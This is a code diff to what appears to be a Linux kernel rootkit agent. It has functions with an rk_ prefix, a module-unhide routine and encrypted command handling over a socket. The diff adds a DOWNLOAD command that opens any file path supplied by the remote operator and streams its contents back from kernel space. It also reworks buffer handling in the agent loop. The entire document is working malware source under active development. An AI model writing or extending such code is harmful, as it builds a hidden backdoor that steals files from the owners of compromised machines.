@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: GPL-2.0
 #include <linux/err.h>
+#include <linux/fs.h>
 #include <linux/errno.h>
 #include <linux/jiffies.h>
 #include <linux/kthread.h>
@@ -26,16 +27,17 @@ extern void rk_module_unhide(void);
 static int rk_agent_reply(struct rk_agent *agent, struct socket *socket,
 			  const unsigned char *plaintext, size_t plaintext_length)
 {
-	unsigned char envelope[RK_FRAME_MAX];
 	size_t envelope_length = 0;
 	int error;
 
 	error = rk_secure_seal_reply(&agent->secure, plaintext,
-				     plaintext_length, envelope,
-				     sizeof(envelope), &envelope_length);
+				     plaintext_length, agent->tx_envelope,
+				     sizeof(agent->tx_envelope),
+				     &envelope_length);
 	if (!error)
-		error = rk_send_frame(socket, envelope, envelope_length);
-	memzero_explicit(envelope, sizeof(envelope));
+		error = rk_send_frame(socket, agent->tx_envelope,
+				      envelope_length);
+	memzero_explicit(agent->tx_envelope, sizeof(agent->tx_envelope));
 	return error;
 }
 
@@ -67,7 +69,7 @@ static int rk_agent_list(struct rk_agent *agent, struct socket *socket,
 			  struct rk_target_list *list,
 			  const struct rk_command *command)
 {
-	unsigned char reply[RK_FRAME_MAX];
+	unsigned char reply[256];
 	size_t reply_length;
 	unsigned long flags;
 
@@ -94,7 +96,7 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 			    bool *close_session)
 {
 	static const unsigned char error_reply[] = "ERR";
-	unsigned char reply[RK_FRAME_MAX];
+	unsigned char reply[256];
 	struct rk_command command;
 	size_t reply_length;
 	struct rk_target_list *list;
@@ -230,6 +232,39 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 					      sizeof(error_reply) - 1);
 		return rk_agent_reply(agent, socket,
 				      (const unsigned char *)"OK", 2);
+	case RK_COMMAND_DOWNLOAD: {
+		struct file *f;
+		loff_t total, pos = 0;
+
+		f = filp_open(command.hide_value, O_RDONLY, 0);
+		if (IS_ERR(f))
+			return rk_agent_reply(agent, socket,
+					      (const unsigned char *)"ERR open", 8);
+		total = i_size_read(file_inode(f));
+		reply_length = scnprintf(reply, sizeof(reply), "FILE %lld", total);
+		error = rk_agent_reply(agent, socket, reply, reply_length);
+		if (error)
+			goto download_close;
+		while (pos < total) {
+			ssize_t got = kernel_read(f, agent->rx_plain,
+						  sizeof(agent->rx_plain),
+						  &pos);
+
+			if (got <= 0)
+				break;
+			error = rk_agent_reply(agent, socket,
+					       agent->rx_plain, got);
+			memzero_explicit(agent->rx_plain,
+					 sizeof(agent->rx_plain));
+			if (error || kthread_should_stop())
+				goto download_close;
+		}
+		error = rk_agent_reply(agent, socket,
+				       (const unsigned char *)"EOF", 3);
+download_close:
+		fput(f);
+		return error;
+	}
 	case RK_COMMAND_INVALID:
 	default:
 		return -EPROTO;
@@ -254,8 +289,6 @@ static int rk_agent_serve(struct rk_agent *agent, struct socket *socket)
 		goto stop_channel;
 
 	for (;;) {
-		struct rk_frame frame;
-		unsigned char plaintext[RK_SECURE_PLAINTEXT_MAX];
 		size_t plaintext_length = 0;
 		bool close_session;
 
@@ -263,20 +296,23 @@ static int rk_agent_serve(struct rk_agent *agent, struct socket *socket)
 			error = 0;
 			break;
 		}
-		error = rk_receive_frame(socket, &frame);
+		error = rk_receive_frame(socket, &agent->rx_frame);
 		if (error)
 			break;
-		error = rk_secure_open_request(&agent->secure, frame.payload,
-					       frame.length, plaintext,
-					       sizeof(plaintext),
+		error = rk_secure_open_request(&agent->secure,
+					       agent->rx_frame.payload,
+					       agent->rx_frame.length,
+					       agent->rx_plain,
+					       sizeof(agent->rx_plain),
 					       &plaintext_length);
 		if (error) {
-			memzero_explicit(plaintext, sizeof(plaintext));
+			memzero_explicit(agent->rx_plain,
+					 sizeof(agent->rx_plain));
 			break;
 		}
-		error = rk_agent_command(agent, socket, plaintext,
+		error = rk_agent_command(agent, socket, agent->rx_plain,
 					 plaintext_length, &close_session);
-		memzero_explicit(plaintext, sizeof(plaintext));
+		memzero_explicit(agent->rx_plain, sizeof(agent->rx_plain));
 		if (error || close_session)
 			break;
 	}
